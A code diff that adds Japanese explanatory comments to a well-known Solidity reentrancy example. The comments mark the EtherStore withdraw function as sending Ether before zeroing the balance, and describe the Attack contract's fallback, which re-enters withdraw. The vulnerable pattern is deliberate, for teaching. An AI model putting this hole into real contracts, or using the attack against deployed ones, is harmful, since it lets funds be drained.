@@ -35,10 +35,13 @@ contract EtherStore {
         balances[msg.sender] += msg.value;
     }
 
+    /**
+     * C-E-Iパターンに従っていないパターン
+     */
     function withdraw() public {
         uint bal = balances[msg.sender];
         require(bal > 0);
-
+        // balancesを0にする前に送信してしまっている・・・。
         (bool sent, ) = msg.sender.call{value: bal}("");
         require(sent, "Failed to send Ether");
 
@@ -59,6 +62,7 @@ contract Attack {
     }
 
     // Fallback is called when EtherStore sends Ether to this contract.
+    // etherを送金するときにfallback関数が呼び出される。
     fallback() external payable {
         if (address(etherStore).balance >= 1 ether) {
             etherStore.withdraw();
